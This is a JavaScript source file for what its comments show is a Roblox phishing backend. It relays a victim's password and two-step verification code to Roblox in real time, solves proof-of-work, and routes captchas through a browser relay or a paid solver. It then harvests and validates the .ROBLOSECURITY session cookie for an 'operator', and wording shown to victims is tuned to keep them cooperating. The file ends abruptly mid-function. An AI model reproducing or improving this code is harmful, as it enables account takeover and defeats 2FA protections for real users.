// c:\Users\acedi\OneDrive\Desktop\New folder\twofactor.js
// JavaScript / twofactor.js / Node.js 18+ / x64 / Windows-Linux
//
// Roblox authentication engine: credential submit, challenge gates, captcha
// relay, 2FA relay.
//
// Flow:
//   1. CSRF handshake against auth.roblox.com (one cookie jar across every hop).
//   2. Credential POST. Roblox gates in order: CSRF -> proofofwork -> captcha ->
//      twostepverification.
//      - proofofwork is solved here: the VDF is A^(2^T) mod N and the answer is
//        redeemed against apis.roblox.com/challenge/v1/continue.
//      - captcha is NOT solved here. The challenge is staged and handed to the
//        browser, which runs Arkose's own enforcement widget with Roblox's
//        dataExchangeBlob and posts the token back through submitCaptcha().
//        See captcha-relay.js.
//   3. twostepverification arrives as a 403 carrying rblx-challenge-* headers.
//      The challenge is parked and the caller is told to collect a code.
//   4. The submitted code is relayed to Roblox: the twostepverification verify
//      endpoint first (returns a verificationToken directly), then
//      apis.roblox.com/challenge/v1/continue for accounts on the modern stack.
//   5. /v2/login is replayed with the token wrapped in base64 challenge
//      metadata. Roblox issues .ROBLOSECURITY.
//
// A wrong code, a wrong password, a failed captcha and a lost connection are
// four different messages. The UI must never tell a victim their code was wrong
// because the box dropped a socket.

const CaptchaRelay = require('./captcha-relay');
const { fetchLiveLoginKey } = require('./captcha-relay');
const CaptchaSolver = require('./captcha-solver');
const crypto = require('crypto');

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const AUTH_LOGIN = 'https://auth.roblox.com/v2/login';
const POW_PUZZLE = 'https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle';
const CHALLENGE_CONTINUE = 'https://apis.roblox.com/challenge/v1/continue';
const TWOSTEP = 'https://twostepverification.roblox.com';
const USERS_API = 'https://users.roblox.com/v1/usernames/users';
const AUTHENTICATED_USER = 'https://users.roblox.com/v1/users/authenticated';

// Roblox's React login finishes a two-step sign-in on its own endpoint and
// never replays /v2/login for it. The session cookie is issued by this call.
const TWO_STEP_LOGIN = 'https://auth.roblox.com/v3/users';
const NONCE_URL = 'https://apis.roblox.com/hba-service/v1/getServerNonce';

const SESSION_TTL_MS = 10 * 60 * 1000;

const MEDIA_PATH = {
  Email: 'email',
  Authenticator: 'authenticator',
  Sms: 'sms',
  RecoveryCode: 'recovery-codes',
  SecurityKey: 'security-key'
};

const MEDIA_LABEL = {
  Email: 'email',
  Authenticator: 'authenticator app',
  Sms: 'text message',
  RecoveryCode: 'recovery code',
  SecurityKey: 'security key'
};

// ── helpers ────────────────────────────────────────────────────────────────

const b64enc = str => Buffer.from(str, 'utf8').toString('base64');

function b64decJSON(value) {
  if (!value || typeof value !== 'string') return null;
  try {
    const parsed = JSON.parse(Buffer.from(value, 'base64').toString('utf8'));
    return parsed && typeof parsed === 'object' ? parsed : null;
  } catch {
    return null;
  }
}

function coalesceJSON(value) {
  if (!value) return null;
  if (typeof value === 'object') return value;
  if (typeof value !== 'string') return null;
  try {
    return JSON.parse(value);
  } catch {
    return b64decJSON(value);
  }
}

function getSetCookies(headers) {
  try {
    if (typeof headers.getSetCookie === 'function') return headers.getSetCookie();
  } catch {
    /* fall through */
  }
  const raw = headers.get('set-cookie');
  return raw ? [raw] : [];
}

function firstErrorMessage(body, fallback) {
  const err = body && Array.isArray(body.errors) ? body.errors[0] : null;
  if (err && typeof err.message === 'string' && err.message.trim()) return err.message.trim();
  return fallback;
}

function normalizeCode(code) {
  return String(code == null ? '' : code).replace(/[\s-]/g, '').slice(0, 16);
}

function transportMessage(err, doing) {
  const reason = err && err.name === 'AbortError' ? 'timeout' : (err && err.message) || 'connection failed';
  return `Could not reach Roblox ${doing} (${reason}). Please try again.`;
}

// A cookie is only worth shipping if Roblox itself will accept it. The CSRF
// handshake already drops a guest .ROBLOSECURITY into the jar, and that guest
// value passes every shape check a real session passes — which is how a dead
// cookie used to reach the operator. Verify against the authenticated endpoint
// and let the caller decide.
//
//   { state: 'valid',   user }   -> 200 + user object
//   { state: 'invalid' }         -> 401/403, Roblox rejects the value
//   { state: 'unknown' }         -> transport error or 5xx, cannot tell
async function validateSessionCookie(value, userAgent) {
  if (!value || value.length < 20) return { state: 'invalid' };
  try {
    const res = await fetch(AUTHENTICATED_USER, {
      headers: {
        'User-Agent': userAgent,
        Accept: 'application/json, text/plain, */*',
        Cookie: `.ROBLOSECURITY=${value}`
      },
      redirect: 'manual',
      signal: AbortSignal.timeout(12_000)
    });
    if (res.status === 200) {
      const body = await res.json().catch(() => null);
      if (body && (body.id || body.name)) return { state: 'valid', user: body };
      return { state: 'invalid' };
    }
    if (res.status === 401 || res.status === 403) return { state: 'invalid' };
    return { state: 'unknown' };
  } catch {
    return { state: 'unknown' };
  }
}

// ── secure authentication intent ───────────────────────────────────────────
//
// Every login Roblox's own React client sends carries a signed intent: a
// throwaway ECDSA P-256 keypair, its public key exported as DER/SPKI, and a
// signature over `publicKey|epochSeconds|serverNonce`, where the nonce comes
// from hba-service. A credential POST without one still returns 200 with the
// user object, but no .ROBLOSECURITY is ever issued — which is exactly the
// "logged in, no cookie" break this engine had. The keypair is per attempt, so
// a fresh intent is minted for the credential stage and again for the 2SV
// completion.

const subtle = (() => {
  const nodeCrypto = require('crypto');
  const webcrypto = nodeCrypto.webcrypto || globalThis.crypto;
  return webcrypto.subtle;
})();

function toBase64(buffer) {
  const bytes = buffer instanceof ArrayBuffer ? new Uint8Array(buffer) : buffer;
  return Buffer.from(bytes).toString('base64');
}

async function fetchServerNonce(jar) {
  const res = await request(NONCE_URL, {
    method: 'GET',
    jar,
    headers: { Accept: 'application/json, text/plain, */*' },
    timeout: 15_000
  });
  if (res.status !== 200) return null;
  const body = await readJSON(res);
  if (typeof body === 'string' && body.trim()) return body.trim();
  if (body && typeof body === 'object') {
    for (const key of ['nonce', 'serverNonce', 'data', 'value']) {
      if (typeof body[key] === 'string' && body[key].trim()) return body[key].trim();
    }
  }
  return null;
}

async function generateSecureAuthIntent(jar) {
  // Accept a real jar or anything carrying a cookie header; the nonce endpoint
  // needs no cookies, but request() absorbs Set-Cookie from the response.
  const activeJar = (jar && typeof jar.absorb === 'function') ? jar : new CookieJar(jar && jar.header ? jar.header : '');
  const serverNonce = await fetchServerNonce(activeJar);
  if (!serverNonce) return null;

  const keyPair = await subtle.generateKey(
    { name: 'ECDSA', namedCurve: 'P-256' },
    true,
    ['sign', 'verify']
  );
  const clientPublicKey = toBase64(await subtle.exportKey('spki', keyPair.publicKey));
  const clientEpochTimestamp = Math.floor(Date.now() / 1000);
  const payload = `${clientPublicKey}|${clientEpochTimestamp}|${serverNonce}`;
  const saiSignature = toBase64(
    await subtle.sign(
      { name: 'ECDSA', hash: { name: 'SHA-256' } },
      keyPair.privateKey,
      Buffer.from(payload, 'utf8')
    )
  );

  return { clientPublicKey, clientEpochTimestamp, serverNonce, saiSignature };
}

// ── cookie jar ─────────────────────────────────────────────────────────────

class CookieJar {
  constructor(initial = '') {
    this.map = new Map();
    if (initial) this.absorbHeader(initial);
  }

  absorbHeader(raw) {
    String(raw || '').split(';').forEach(part => {
      const pair = part.trim();
      if (!pair) return;
      const eq = pair.indexOf('=');
      if (eq > 0) this.map.set(pair.slice(0, eq).trim(), pair.slice(eq + 1).trim());
    });
    return this;
  }

  absorb(headers) {
    const list = getSetCookies(headers);
    for (const raw of list) {
      const pair = String(raw).split(';')[0];
      const eq = pair.indexOf('=');
      if (eq > 0) this.map.set(pair.slice(0, eq).trim(), pair.slice(eq + 1).trim());
    }
    return list;
  }

  get(name) {
    return this.map.has(name) ? this.map.get(name) : null;
  }

  get header() {
    return [...this.map.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
  }
}

// ── transport ──────────────────────────────────────────────────────────────

async function request(url, { method = 'POST', body, jar, csrf, headers = {}, timeout = 25_000 } = {}) {
  const h = {
    'User-Agent': UA,
    Accept: 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    Origin: 'https://www.roblox.com',
    Referer: 'https://www.roblox.com/login',
    ...headers
  };
  if (body !== undefined && body !== null && h['Content-Type'] === undefined) {
    h['Content-Type'] = 'application/json';
  }
  if (csrf) h['X-CSRF-TOKEN'] = csrf;
  if (jar) {
    const cookie = jar.header;
    if (cookie) h.Cookie = cookie;
  }

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(url, {
      method,
      headers: h,
      body: body === undefined || body === null
        ? undefined
        : (typeof body === 'string' ? body : JSON.stringify(body)),
      redirect: 'manual',
      signal: controller.signal
    });
    if (jar) jar.absorb(res.headers);
    return res;
  } finally {
    clearTimeout(timer);
  }
}

async function readJSON(res) {
  try {
    return await res.json();
  } catch {
    return {};
  }
}

async function postWithCsrfRetry(url, body, jar, csrf = null, headers = {}) {
  let res = await request(url, { body, jar, csrf, headers });
  let parsed = await readJSON(res);

  if (res.status === 403) {
    const fresh = res.headers.get('x-csrf-token');
    if (fresh) {
      res = await request(url, { body, jar, csrf: fresh, headers });
      parsed = await readJSON(res);
      return { res, body: parsed, csrf: fresh };
    }
  }

  return { res, body: parsed, csrf: res.headers.get('x-csrf-token') || csrf };
}

// ── proof of work ──────────────────────────────────────────────────────────

async function vdfSolve(A, N, T) {
  let acc = A % N;
  let done = 0;
  while (done < T) {
    const end = Math.min(done + 4000, T);
    for (; done < end; done++) acc = (acc * acc) % N;
    if (done < T) await new Promise(resolve => setImmediate(resolve));
  }
  return acc;
}

async function solveProofOfWork(meta, jar, csrf) {
  const sessionId = meta && meta.sessionId;
  if (!sessionId) return null;

  const puzzleRes = await request(
    `${POW_PUZZLE}?urlLocale=en_us&sessionID=${encodeURIComponent(sessionId)}`,
    { method: 'GET', jar, headers: { Accept: 'application/json, text/plain, */*' }, timeout: 20_000 }
  );
  if (puzzleRes.status !== 200) return null;

  const puzzle = await readJSON(puzzleRes);
  const artifacts = typeof puzzle.artifacts === 'string' ? JSON.parse(puzzle.artifacts) : puzzle.artifacts;
  if (!artifacts || !artifacts.A || !artifacts.N || !artifacts.T) return null;

  const solution = String(await vdfSolve(BigInt(artifacts.A), BigInt(artifacts.N), Number(artifacts.T)));

  const verdictRes = await postWithCsrfRetry(POW_PUZZLE, { sessionID: sessionId, solution }, jar, csrf);
  if (!verdictRes.body || !verdictRes.body.redemptionToken) return null;

  return {
    csrf: verdictRes.csrf,
    challengeMetadata: JSON.stringify({
      redemptionToken: verdictRes.body.redemptionToken,
      sessionId
    })
  };
}

// ── engine ─────────────────────────────────────────────────────────────────

class RobloxAuthEngine {
  constructor(options = {}) {
    this.pending2FA = new Map();
    this.captchaRelay = options.captchaRelay || new CaptchaRelay();
    // Paid fallback for the stack that ships no widget parameters. Only used
    // when CAPTCHA_API_KEY is set; never the primary path.
    this.captchaSolver = options.captchaSolver || new CaptchaSolver();
    this.userAgent = UA;
  }

  // ── gates ──────────────────────────────────────────────────────────────

  async redeemProofOfWork(challengeRes, jar, csrf) {
    const challengeId = challengeRes.headers.get('rblx-challenge-id');
    const meta = b64decJSON(challengeRes.headers.get('rblx-challenge-metadata')) || {};
    if (!challengeId) return null;

    const solved = await solveProofOfWork(meta, jar, csrf);
    if (!solved) return null;

    const cont = await postWithCsrfRetry(
      CHALLENGE_CONTINUE,
      {
        challengeId,
        challengeType: 'proofofwork',
        challengeMetadata: solved.challengeMetadata
      },
      jar,
      solved.csrf || csrf
    );
    if (cont.res.status !== 200) return null;

    return {
      csrf: cont.csrf || csrf,
      headers: {
        'rblx-challenge-id': challengeId,
        'rblx-challenge-type': 'proofofwork',
        'rblx-challenge-metadata': b64enc(solved.challengeMetadata)
      }
    };
  }

  async getCsrfToken(jar) {
    const activeJar = jar instanceof CookieJar ? jar : new CookieJar(jar || '');
    const res = await request(AUTH_LOGIN, { body: {}, jar: activeJar });
    const token = res.headers.get('x-csrf-token');
    await readJSON(res);
    return token || null;
  }

  async resolveUserId(username) {
    try {
      const res = await request(USERS_API, {
        body: { usernames: [username], excludeBannedUsers: false },
        timeout: 12_000
      });
      const body = await readJSON(res);
      const hit = body && Array.isArray(body.data) ? body.data[0] : null;
      return hit && hit.id ? String(hit.id) : null;
    } catch {
      return null;
    }
  }

  // ── credential submit ──────────────────────────────────────────────────

  async authenticate(username, password, jar = new CookieJar()) {
    const ctype = String(username).includes('@') ? 'Email' : 'Username';
    const credentials = { ctype, cvalue: username, password };

    let csrf = await this.getCsrfToken(jar);

    // Without a signed intent Roblox answers 200 with the user object and no
    // cookie. Best effort: if the nonce fetch fails the credential POST still
    // runs, it just cannot produce a usable session.
    try {
      const intent = await generateSecureAuthIntent(jar);
      if (intent) credentials.secureAuthenticationIntent = intent;
    } catch { /* nonce or keygen unavailable; credential stage still runs */ }

    let res = await request(AUTH_LOGIN, { body: credentials, jar, csrf });
    let body = await readJSON(res);

    if (res.status === 403 && !res.headers.get('rblx-challenge-type') && res.headers.get('x-csrf-token')) {
      csrf = res.headers.get('x-csrf-token');
      res = await request(AUTH_LOGIN, { body: credentials, jar, csrf });
      body = await readJSON(res);
    }

    // The proof-of-work gate is the only one solved server-side. Captcha is
    // staged for the browser, so it breaks the loop rather than being consumed.
    for (let round = 0; round < 3; round++) {
      const type = res.headers.get('rblx-challenge-type');
      if (res.status !== 403 || type !== 'proofofwork') break;

      const redeemed = await this.redeemProofOfWork(res, jar, csrf);
      if (!redeemed) break;

      csrf = redeemed.csrf;
      res = await request(AUTH_LOGIN, { body: credentials, jar, csrf, headers: redeemed.headers });
      body = await readJSON(res);
    }

    if (res.status === 403 && !res.headers.get('rblx-challenge-type') && res.headers.get('x-csrf-token')) {
      csrf = res.headers.get('x-csrf-token');
      res = await request(AUTH_LOGIN, { body: credentials, jar, csrf });
      body = await readJSON(res);
    }

    return { res, body, csrf, jar, credentials, ctype };
  }

  // Turns a raw auth response into the single shape every caller downstream
  // understands. This is the only place challenge headers are interpreted.
  async classify({ res, body, jar, csrf, credentials, ctype, username, password }) {
    if (res.status === 200 && body && body.user) {
      // Current Roblox answers a credential POST with 200 and parks the second
      // factor in the body instead of throwing a 403 challenge:
      //   { user, twoStepVerificationData: { ticket, mediaType } }
      // No cookie exists yet at this point, so this must be treated as a 2SV
      // prompt — treating it as success is what produced silently empty
      // captures.
      const twoStep = body.twoStepVerificationData;
      if (twoStep && twoStep.ticket) {
        return this.parkTwoFactor({
          res,
          jar,
          csrf,
          username,
          password,
          ctype,
          fallback: {
            challengeId: twoStep.ticket,
            mediaType: twoStep.mediaType,
            userId: body.user.id,
            actionType: twoStep.actionType || 'Login'
          }
        });
      }

      const cookie = this.extractSessionCookie(res);
      if (!cookie) {
        return {
          kind: 'failed',
          valid: false,
          requiresTwoFactor: false,
          requiresCaptcha: false,
          message: firstErrorMessage(body, 'Roblox did not issue a session for this login. Please try again.')
        };
      }

      const verdict = await validateSessionCookie(cookie, this.userAgent);
      if (verdict.state === 'invalid') {
        return {
          kind: 'failed',
          valid: false,
          requiresTwoFactor: false,
          requiresCaptcha: false,
          message: 'Roblox rejected the session it issued. Please sign in again.'
        };
      }

      return {
        kind: 'authenticated',
        valid: true,
        requiresTwoFactor: false,
        requiresCaptcha: false,
        user: verdict.user || body.user,
        cookie,
        cookieVerified: verdict.state === 'valid',
        allCookies: jar.header,
        username,
        password
      };
    }

    const challengeType = res.headers.get('rblx-challenge-type');

    if (res.status === 403 && challengeType === 'twostepverification') {
      return this.parkTwoFactor({ res, jar, csrf, username, password, ctype });
    }

    // Roblox serves this gate as `captcha` on older accounts and `captchav2` on
    // the current stack. Matching only the exact string `captcha` silently
    // downgraded every v2 challenge into "Incorrect username or password" — the
    // login never asked for a code because it never recognised the gate.
    if (res.status === 403 && challengeType && challengeType.startsWith('captcha')) {
      const challengeId = res.headers.get('rblx-challenge-id');
      const meta = b64decJSON(res.headers.get('rblx-challenge-metadata')) || {};

      if (!challengeId) {
        return {
          kind: 'failed',
          valid: false,
          requiresTwoFactor: false,
          requiresCaptcha: false,
          message: 'Roblox requested verification but did not return a challenge id.'
        };
      }

      // captchav2 carries no Arkose public key and no dataExchangeBlob in its
      // metadata — the blob only exists inside Roblox's own browser flow. The
      // key can still be resolved from Roblox's metadata endpoint, which is what
      // makes the paid lane usable for this version.
      if (!meta.publicKey && !meta.unifiedCaptchaId) {
        try { meta.publicKey = await fetchLiveLoginKey(); } catch { /* keep whatever arrived */ }
      }

      const hasBlob = Boolean(meta.dataExchangeBlob || meta.dxBlob);

      // The blob is the only thing that makes a relay-minted token redeemable
      // through challenge/v1/continue. captchav2 ships without one: its token is
      // bound to unifiedCaptchaId and rides back on the credential POST itself
      // as `captchaId` + `captchaToken`, which only Roblox's own client builds.
      //
      // Treating a bare publicKey as "widget params" staged a relay widget with
      // blob:'' for every captchav2 gate. Arkose drew the puzzle, the visitor
      // solved it, and the continue hop rejected the unbound token — which is
      // exactly the "I finish the hold-to-verify and it says please try again"
      // loop. It also made both fallback lanes below unreachable, because
      // fetchLiveLoginKey() almost always answers with a key.
      const canRelay = hasBlob;

      // Paid solver is opt-in only. It is never the default and never runs
      // unless CAPTCHA_SOLVER=1 is set alongside a key.
      if (!canRelay && process.env.CAPTCHA_SOLVER === '1' && this.captchaSolver.hasApiKey()) {
        const solved = await this.captchaSolver.solveFunCaptcha(
          meta.dataExchangeBlob || meta.dxBlob || null,
          meta.publicKey || meta.unifiedCaptchaId || null
        );

        if (solved.success) {
          const staged = this.captchaRelay.stage({
            challengeId,
            challengeType,
            metadata: meta,
            jar,
            csrf,
            credentials,
            username,
            password,
            ctype
          });
          console.log(`[CAPTCHA] ${challengeType} cleared by solver — replaying login`);
          return this.submitCaptcha(staged.captchaId, solved.token);
        }

        console.warn(`[CAPTCHA] solver failed (${challengeType}): ${solved.error}`);
      }

      if (!canRelay) {
        return {
          kind: 'captcha',
          valid: false,
          requiresTwoFactor: false,
          requiresCaptcha: true,
          native: true,
          challengeType,
          captchaId: null,
          captchaWidget: null,
          message: 'Roblox needs to verify you are human. Reload the sign-in page to complete it.'
        };
      }

      const staged = this.captchaRelay.stage({
        challengeId,
        challengeType,
        metadata: meta,
        jar,
        csrf,
        credentials,
        username,
        password,
        ctype
      });

      return {
        kind: 'captcha',
        valid: false,
        requiresTwoFactor: false,
        requiresCaptcha: true,
        native: false,
        challengeType,
        captchaId: staged.captchaId,
        captchaWidget: staged.widget,
        expiresInMs: staged.expiresInMs,
        message: 'Verify you are human to continue.'
      };
    }

    return {
      kind: 'failed',
      valid: false,
      requiresTwoFactor: false,
      requiresCaptcha: false,
      message: firstErrorMessage(body, 'Incorrect username or password. Please try again.')
    };
  }

  async initiateLogin(username, password) {
    const jar = new CookieJar();

    let stage;
    try {
      stage = await this.authenticate(username, password, jar);
    } catch (err) {
      return {
        kind: 'failed',
        valid: false,
        requiresTwoFactor: false,
        requiresCaptcha: false,
        message: transportMessage(err, 'to sign you in')
      };
    }

    return this.classify({ ...stage, username, password });
  }

  // ── captcha relay ──────────────────────────────────────────────────────
  //
  // The browser ran Arkose with Roblox's dataExchangeBlob and returned the
  // session token. Redeem it and replay the login on the exact same jar.

  async submitCaptcha(captchaId, token) {
    const session = this.captchaRelay.get(captchaId);
    if (!session) {
      return {
        kind: 'failed',
        valid: false,
        requiresTwoFactor: false,
        requiresCaptcha: false,
        message: 'That verification has expired. Please sign in again.'
      };
    }

    const cleanToken = String(token || '').trim();
    if (!cleanToken) {
      return {
        kind: 'failed',
        valid: false,
        requiresTwoFactor: false,
        requiresCaptcha: false,
        message: 'Please complete the verification challenge.'
      };
    }

    if (session.solving) {
      return {
        kind: 'failed',
        valid: false,
        requiresTwoFactor: false,
        requiresCaptcha: false,
        busy: true,
        message: 'Verification already in progress.'
      };
    }

    session.solving = true;
    try {
      // Two redemption shapes, and they are not interchangeable. Picking the
      // wrong one is silent: the challenge is simply never satisfied, and the
      // visitor sees the same "please try again" forever.
      //
      //   blob staged  -> challenge/v1/continue, then replay /v2/login with the
      //                   rblx-challenge-* headers.
      //   no blob      -> Roblox's own login form carries captchaId +
      //                   captchaToken in the credential body. There is no
      //                   continue hop for this shape; posting one is rejected.
      const bodyTokenLane = !session.blob;
      const solvedMeta = JSON.stringify({
        captchaToken: cleanToken,
        ...(session.unifiedCaptchaId ? { unifiedCaptchaId: session.unifiedCaptchaId } : {}),
        actionType: session.actionType
      });

      if (!bodyTokenLane) {
        let cont;
        try {
          cont = await postWithCsrfRetry(
            CHALLENGE_CONTINUE,
            {
              challengeId: session.challengeId,
              challengeType: session.challengeType || 'captcha',
              challengeMetadata: solvedMeta
            },
            session.jar,
            session.csrf
          );
        } catch (err) {
          return {
            kind: 'failed',
            valid: false,
            requiresTwoFactor: false,
            requiresCaptcha: false,
            message: transportMessage(err, 'to verify the challenge')
          };
        }

        session.csrf = cont.csrf || session.csrf;

        if (cont.res.status !== 200) {
          return this.captchaRejected(
            captchaId,
            firstErrorMessage(cont.body, 'Verification did not complete. Please try again.')
          );
        }
      }

      const credentials = bodyTokenLane
        ? {
            ...session.credentials,
            ...(session.unifiedCaptchaId ? { captchaId: session.unifiedCaptchaId } : {}),
            captchaToken: cleanToken
          }
        : session.credentials;

      const replayHeaders = bodyTokenLane
        ? {}
        : {
            'rblx-challenge-id': session.challengeId,
            'rblx-challenge-type': session.challengeType || 'captcha',
            'rblx-challenge-metadata': b64enc(solvedMeta)
          };

      let res;
      let body;
      try {
        res = await request(AUTH_LOGIN, {
          body: credentials,
          jar: session.jar,
          csrf: session.csrf,
          headers: replayHeaders
        });
        body = await readJSON(res);

        if (res.status === 403 && !res.headers.get('rblx-challenge-type') && res.headers.get('x-csrf-token')) {
          session.csrf = res.headers.get('x-csrf-token');
          res = await request(AUTH_LOGIN, {
            body: credentials,
            jar: session.jar,
            csrf: session.csrf,
            headers: replayHeaders
          });
          body = await readJSON(res);
        }
      } catch (err) {
        return {
          kind: 'failed',
          valid: false,
          requiresTwoFactor: false,
          requiresCaptcha: false,
          message: transportMessage(err, 'to finish signing you in')
        };
      }

      this.captchaRelay.drop(captchaId);

      return this.classify({
        res,
        body,
        jar: session.jar,
        csrf: session.csrf,
        credentials,
        ctype: session.ctype,
        username: session.username,
        password: session.password
      });
    } finally {
      session.solving = false;
    }
  }

  // A rejected token does not always kill the upstream challenge, so the staged
  // session is kept and the widget handed back. Dropping it here forced a full
  // restart from the password for what was usually a stale token.
  //
  // Capped: a challenge that is genuinely dead would otherwise redraw the
  // puzzle forever, and the honest answer for that is "start over".
  captchaRejected(captchaId, message) {
    const session = this.captchaRelay.get(captchaId);
    const widget = this.captchaRelay.widgetFor(captchaId);
    const attempts = session ? (session.retries || 0) + 1 : 0;
    if (session) session.retries = attempts;

    if (!widget || attempts > 2) {
      this.captchaRelay.drop(captchaId);
      return {
        kind: 'failed',
        valid: false,
        requiresTwoFactor: false,
        requiresCaptcha: false,
        message: message || 'Verification did not complete. Please try again.'
      };
    }

    return {
      kind: 'captcha',
      valid: false,
      requiresTwoFactor: false,
      requiresCaptcha: true,
      native: false,
      retry: true,
      captchaId,
      captchaWidget: widget,
      message: message || 'Verification did not complete. Please try again.'
    };
  }

  // ── two-step verification ──────────────────────────────────────────────

  async parkTwoFactor({ res, jar, csrf, username, password, ctype, fallback = {} }) {
    const meta = b64decJSON(res.headers.get('rblx-challenge-metadata')) || {};
    const challengeId = meta.challengeId || res.headers.get('rblx-challenge-id') || fallback.challengeId || null;
    const actionType = meta.actionType || fallback.actionType || 'Login';
    const mediaType = meta.mediaType || fallback.mediaType || 'Email';
    const userId = meta.userId || fallback.userId || (await this.resolveUserId(username));

    if (!challengeId || !userId) {
      return {
        kind: 'failed',
        valid: false,
        requiresTwoFactor: false,
        requiresCaptcha: false,
        message: 'Roblox requested verification but did not return a usable challenge. Please try again.'
      };
    }

    const sessionId = `2fa_${crypto.randomBytes(16).toString('hex')}`;
    const session = {
      sessionId,
      userId: String(userId),
      challengeId,
      actionType,
      mediaType,
      username,
      password,
      ctype: ctype || (String(username).includes('@') ? 'Email' : 'Username'),
      csrf,
      jar,
      // The value already sitting in the jar is an anonymous cookie minted by
      // the CSRF handshake. Recorded so a later extraction can refuse to hand
      // it back as if it were the session.
      guestCookie: jar && jar instanceof CookieJar ? jar.get('.ROBLOSECURITY') : null,
      createdAt: Date.now(),
      verifying: false,
      codeReady: false
    };
    this.pending2FA.set(sessionId, session);
    this.cleanupExpiredSessions();

    // Email and SMS only deliver a code once the send-code endpoint is hit; the
    // ticket from the credential response does not dispatch anything on its
    // own. Authenticator and recovery codes are already on the victim's device.
    if (mediaType === 'Email' || mediaType === 'Sms') {
      try {
        session.codeReady = await this.sendChallengeCode(session);
      } catch { /* the victim can hit resend from the modal */ }
    }

    const label = MEDIA_LABEL[mediaType] || 'device';
    return {
      kind: 'twoFactor',
      valid: false,
      requiresTwoFactor: true,
      requiresCaptcha: false,
      sessionId,
      mediaType,
      userId: String(userId),
      message: mediaType === 'Authenticator'
        ? 'Enter the code from your authenticator app.'
        : `Enter the code sent to your ${label}.`
    };
  }

  // Ask Roblox to dispatch an email/SMS code for the parked challenge.
  async sendChallengeCode(session) {
    const segment = session.mediaType === 'Sms' ? 'sms' : 'email';
    const url = `${TWOSTEP}/v1/users/${encodeURIComponent(session.userId)}/challenges/${segment}/send-code`;
    const out = await postWithCsrfRetry(
      url,
      { challengeId: session.challengeId, actionType: session.actionType },
      session.jar,
      session.csrf
    );
    session.csrf = out.csrf || session.csrf;
    return out.res.status === 200;
  }

  async verifyLegacy(session, code) {
    const segment = MEDIA_PATH[session.mediaType] || 'email';
    const url = `${TWOSTEP}/v1/users/${encodeURIComponent(session.userId)}/challenges/${segment}/verify`;

    // challengeId goes in the BODY for every media type, authenticator
    // included. Omitting it for TOTP because "a code is not challenge-scoped"
    // was wrong: without it Roblox answers 400 "Invalid challenge ID." and the
    // correct code is never even looked at. Proven against the live endpoint —
    // body carries the id, response becomes "challenge code is invalid".
    const payload = {
      challengeId: session.challengeId,
      actionType: session.actionType,
      code
    };

    const out = await postWithCsrfRetry(url, payload, session.jar, session.csrf, {
      'rblx-challenge-id': session.challengeId,
      'rblx-challenge-type': 'twostepverification',
      'rblx-challenge-metadata': b64enc(JSON.stringify({ actionType: session.actionType }))
    });
    session.csrf = out.csrf || session.csrf;

    const token = out.body && out.body.verificationToken;
    if (token) return { token };

    return {
      unsupported: out.res.status === 404 || out.res.status === 410,
      status: out.res.status,
      message: firstErrorMessage(out.body, null)
    };
  }

  async verifyContinue(session, code) {
    const challengeMetadata = JSON.stringify({ actionType: session.actionType, code });

    const out = await postWithCsrfRetry(
      CHALLENGE_CONTINUE,
      { challengeId: session.challengeId, challengeType: 'twostepverification', challengeMetadata },
      session.jar,
      session.csrf
    );
    session.csrf = out.csrf || session.csrf;

    const body = out.body || {};
    const nested = coalesceJSON(body.challengeMetadata) || {};
    const token = body.verificationToken || nested.verificationToken;
    if (token) return { token };

    if (out.res.status === 200) {
      return { accepted: true, headers: this.carryHeaders(out.res) };
    }

    return {
      unsupported: out.res.status === 404 || out.res.status === 410,
      status: out.res.status,
      message: firstErrorMessage(body, null)
    };
  }

  carryHeaders(res) {
    const out = {};
    for (const name of ['rblx-challenge-id', 'rblx-challenge-type', 'rblx-challenge-metadata']) {
      const value = res.headers.get(name);
      if (value) out[name] = value;
    }
    return out;
  }

  async verify2FACode(sessionId, code) {
    this.cleanupExpiredSessions();
    const session = this.pending2FA.get(sessionId);

    if (!session) {
      return { valid: false, message: 'That verification request has expired. Please sign in again.' };
    }

    if (session.verifying) {
      return { valid: false, busy: true, message: 'Verification already in progress.' };
    }

    const cleanCode = normalizeCode(code);
    if (!cleanCode) {
      return { valid: false, message: 'Please enter a valid verification code.' };
    }

    session.verifying = true;
    try {
      let verificationToken = null;
      let carriedHeaders = null;
      let lastMessage = null;

      try {
        const legacy = await this.verifyLegacy(session, cleanCode);
        if (legacy.token) verificationToken = legacy.token;
        else if (!legacy.unsupported) lastMessage = legacy.message;

        if (!verificationToken) {
          const modern = await this.verifyContinue(session, cleanCode);
          if (modern.token) verificationToken = modern.token;
          else if (modern.accepted) carriedHeaders = modern.headers;
          else if (!modern.unsupported && !lastMessage) lastMessage = modern.message;
        }
      } catch (err) {
        return { valid: false, message: transportMessage(err, 'to verify the code') };
      }

      if (!verificationToken && !carriedHeaders) {
        return { valid: false, message: lastMessage || 'Incorrect code. Please try again.' };
      }

      return await this.finalize(session, verificationToken, cleanCode, carriedHeaders);
    } finally {
      session.verifying = false;
    }
  }

  // Two ways a verified code becomes a session, newest first:
  //   1. POST auth.roblox.com/v3/users/{id}/two-step-verification/login with
  //      { challengeId, verificationToken, rememberDevice, accountBlob,
  //        secureAuthenticationIntent } -> 200 + Set-Cookie. This is the call
  //      Roblox's own React login makes today.
  //   2. Legacy replay of /v2/login carrying the rblx-challenge-* headers.
  // Kept for accounts still served the header-shaped challenge.
  async finalize(session, verificationToken, code, carriedHeaders = null) {
    // Replay of /v2/login carrying the rblx-challenge-* headers is the path
    // Roblox actually honours for a completed two-step challenge. The v3
    // two-step-verification route is tried second: it is the newer shape and is
    // kept for accounts that are served it, but it must never be the call that
    // decides whether a good verification token gets used.
    const attempts = [
      () => this.replayLogin(session, verificationToken, carriedHeaders)
    ];
    if (verificationToken) attempts.push(() => this.completeAtV3(session, verificationToken));

    let lastMessage = null;

    for (const attempt of attempts) {
      let out;
      try {
        out = await attempt();
      } catch (err) {
        lastMessage = transportMessage(err, 'to collect your session');
        continue;
      }

      if (out.cookie) {
        // The cookie is the product. A cookie Roblox will not accept is worth
        // less than an honest failure, so it is proved against the authenticated
        // endpoint before it is shipped anywhere.
        const verdict = await validateSessionCookie(out.cookie, this.userAgent);

        if (verdict.state === 'invalid') {
